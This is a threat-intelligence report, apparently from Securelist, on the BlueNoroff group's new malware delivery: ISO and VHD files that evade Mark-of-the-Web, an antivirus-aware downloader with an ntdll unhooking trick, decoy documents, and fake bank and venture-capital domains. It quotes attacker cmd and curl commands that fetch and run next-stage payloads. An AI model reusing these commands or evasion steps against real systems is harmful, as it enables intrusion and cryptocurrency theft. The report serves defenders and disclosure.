												<div class="c-wysiwyg">
													<p>BlueNoroff group is a financially motivated threat actor eager to profit from its cyberattack capabilities. We have <a href="https://securelist.com/the-bluenoroff-cryptocurrency-hunt-is-still-on/105488/" target="_blank" rel="noopener">published</a> technical details of how this notorious group steals cryptocurrency before. We continue to track the group&#8217;s activities and this October we observed the adoption of new malware strains in its arsenal. The group usually takes advantage of Word documents and uses shortcut files for the initial intrusion. However, it has recently started to adopt new methods of malware delivery.</p>
<p>The first new method the group adopted is aimed at evading the Mark-of-the-Web (MOTW) flag, the security measure whereby Windows displays a warning message when the user tries to open a file downloaded from the internet. To do this, optical disk image (.iso extension) and virtual hard disk (.vhd extension) file formats were used. This is a common tactic used nowadays to evade MOTW, and BlueNoroff has also adopted it.</p>
<p>In addition, the group tested different file types to refine malware delivery methods. We observed a new Visual Basic Script, a previously unseen Windows Batch file, and a Windows executable. It seems the actors behind BlueNoroff are expanding or experimenting with new file types to convey their malware efficiently.</p>
<p>After researching the infrastructure that was utilized, we discovered more than 70 domains used by this group, meaning they were very active until recently. Also, they created numerous fake domains that look like venture capital and bank domains. Most of the domains imitate Japanese venture capital companies, indicating that the group has an extensive interest in Japanese financial entities.</p>
<h2 id="executive-summary">Executive summary</h2>
<ul>
<li>BlueNoroff group introduced new file types to evade Mark-of-the-Web (MOTW) security measures;</li>
<li>BleuNoroff group expanded file types and tweaked infection methods;</li>
<li>BlueNoroff created numerous fake domains impersonating venture capital companies and banks.</li>
</ul>
<h2 id="background">Background</h2>
<p>At the end of September 2022, we observed new BlueNoroff malware in our telemetry. After a careful investigation, we confirmed that the actor had adopted new techniques to convey the final payload. The actor took advantage of several scripts, including Visual Basic Script and Windows Batch script. They also started using disk image file formats, .iso and .vhd, to deliver their malware. For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload. Although the initial intrusion methods were very different in this campaign, the final payload that we had analyzed previously was used without significant changes.</p>
<p style="text-align: center"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01.png" class="magnificImage"><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-108385" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01-1024x595.png" alt="Novel infection chain" width="1024" height="595" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01-1024x595.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01-300x174.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01-768x446.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01-1536x892.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01-301x175.png 301w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01-370x215.png 370w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01-482x280.png 482w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01-800x465.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01.png 1808w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></p>
<p style="text-align: center"><strong><em>Novel infection chain</em></strong></p>
<h2 id="long-lasting-initial-infection">Long-lasting initial infection</h2>
<p>Based on our telemetry, we observed that one victim in the UAE was attacked using a malicious Word document. The victim received a document file named &#8220;Shamjit Client Details Form.doc&#8221; on September 2, 2022. Unfortunately, we couldn&#8217;t acquire the document, but it was executed from the following path:<br />
<code>C:\Users\[username]\Desktop\SALES OPS [redacted]\[redacted]\Signed Forms &amp; Income Docs\Shamjit Client Details Form.doc</code></p>
<p>Judging from the file path, we can assume that the victim was an employee in the sales department responsible for signing contracts.</p>

<h2 id="updated-method-1-tricks-to-evade-motw-flag">Updated method #1: Tricks to evade MOTW flag</h2>
<p>We observed that the actor examined different file types to deliver their malware. Recently, many threat actors have adopted image files to avoid MOTW (Mark-of-the-Web). In a nutshell, MOTW is a mitigation technique introduced by Microsoft. The NTFS file system marks a file downloaded from the internet, and Windows handles the file in a safe way. For example, when a Microsoft Office file is fetched from the internet, the OS opens it in Protected View, which restricts the execution of the embedded macro. In order to avoid this mitigation technique, more threat actors have started abusing ISO file types. The BlueNoroff group likely experimented with ISO image files to deliver their malware. Although it&#8217;s still under development, we mention this sample as an early warning. This ISO image file contains one PowerPoint slide show and one Visual Basic Script.</p>

<p style="text-align: center"><strong><em>Infection flow of downloader</em></strong></p>
<p>This downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender. If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classic <a href="https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++" target="_blank" rel="noopener">unhooking DLL trick</a> intended to remove user-mode hooks from the system library. This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address. With this trick, the malware can disable the functionalities of EDR/AV products. Next, the malware creates a mutex to avoid duplicate execution.</p>
<ul>
<li>Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03f</li>
</ul>
<p>Next, the malware opens a PDF decoy document in the same directory. The decoy document masquerades as a job offer from a Japanese multinational bank.</p>
<p>If Windows Defender or Bitdefender Antivirus is installed on the victim&#8217;s computer, the malware executes itself with the following commands:</p>
<ul>
<li>Windows Defender: <em>cmd /c timeout /t 10 &amp; Del /f /q \&#8221;[current file name]\&#8221; &amp; attrib -s -h \&#8221;[PDF decoy file]\&#8221; &amp; rundll32 \&#8221;[current DLL file path]\&#8221; #1</em></li>
<li>Bitdefender: <em>cmd /c timeout /t 10 &amp; rundll32 \&#8221;[current DLL file path]\&#8221; #1</em></li>
</ul>
<p>The primary objective of this malware is to fetch the next stage payload. To do this, the malware uses the cURL library, combining cURL commands depending on the antivirus installed.</p>
<ul>
<li>Avira or Avast installed: <em>curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -d <strong>da</strong></em></li>
<li>Other cases: <em>curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -d <strong>dl</strong></em></li>
</ul>
<p>Note that the user-agent name is &#8220;<strong>cur1-agent</strong>&#8220;, and the malware sends &#8220;<em>da</em>&#8221; POST data if the victim installed Avira or Avast; otherwise, the malware sends &#8220;<em>dl</em>&#8221; POST data. If the fetched data by cURL command contains &#8220;&lt;html&gt;&#8221; and &#8220;curl:&#8221;, the malware decrypts the payload with a delivered 64-byte RC4 key.</p>
<p>If Avira or Avast are installed, the malware saves the decrypted payload to &#8220;<em>%TEMPLATES%\marcoor.dll</em>&#8221; and spawns it with the rundll32.exe command with the payload URL.</p>
<ul>
<li>command: <em>exe %TEMPLATES%\marcoor.dll #1 [payload URL]</em></li>
</ul>
<p>Otherwise, the malware doesn&#8217;t write the payload to the file and injects the fetched payload into the explorer.exe process. The fetched payload is a DLL type executable and its export function is spawned with the &#8220;payload URL&#8221;.</p>
<p>Unfortunately, we haven&#8217;t been able to obtain a precise infection chain so far. From our telemetry, however, we can confirm the victim was eventually compromised by backdoor-type malware. Based on the malware&#8217;s static information, and parts of the internal code, we assess that the final payload is still very similar to the Persistence Backdoor #2<a href="#_ftn1" name="_ftnref1"><sup>[1]</sup></a> we described in our previous <a href="https://securelist.com/the-bluenoroff-cryptocurrency-hunt-is-still-on/105488/" target="_blank" rel="noopener">blog</a>.</p>

Also, we observed this group introduce a new Windows executable-type downloader at this time. This malware (MD5 <a href="https://opentip.kaspersky.com/087407551649376d90d1743bac75aac8/" rel="noopener" target="_blank">087407551649376d90d1743bac75aac8</a>) spawns a fake password file while fetching a remote payload and executing it. Upon execution, it creates a fake file (wae.txt) to show a password composed of the string <em>&#8216;password&#8217;</em> and fetches a payload from the embedded URL and loads it. This scheme, showing a password via notepad.exe, is a trick favored by the BlueNoroff group to avoid arousing the victim&#8217;s suspicion. Usually, the password contains the password needed to open the supplied encrypted decoy document.</p>

<h2 id="victims">Victims</h2>
<p>As we described in the section &#8216;Long-lasting initial infection&#8217;, we discovered that one victim in the UAE, probably a home financing company, was compromised by classic BlueNoroff group malware. This financially motivated threat actor has been attacking various cryptocurrency-related businesses lately, but also other financial companies, as in this case.</p>
<p>In addition, based on the domain naming and decoy documents, we assume, with low confidence, that the entities in Japan are on the radar of this group. In one PowerPoint sample, we observed that the actor took advantage of a Japanese venture capital company. Also, the samples we mentioned in the &#8216;Long-lasting initial infection&#8217; section above were delivered to the victim with a Japanese file name, suggesting the target can read Japanese.</p>

<h2 id="conclusion">Conclusion</h2>
<p>According to a recent <a href="https://edition.cnn.com/2022/07/10/politics/north-korean-hackers-crypto-currency-firms-infiltrate/index.html">report</a>, the BlueNoroff group stole cryptocurrency worth millions using their cyberattack capabilities. It shows that this group has a strong financial motivation and actually succeeds in making profits from their cyberattacks. As we can see from our latest finding, this notorious actor has introduced slight modifications to deliver their malware. This also suggests that attacks by this group are unlikely to decrease in the near future.</p>
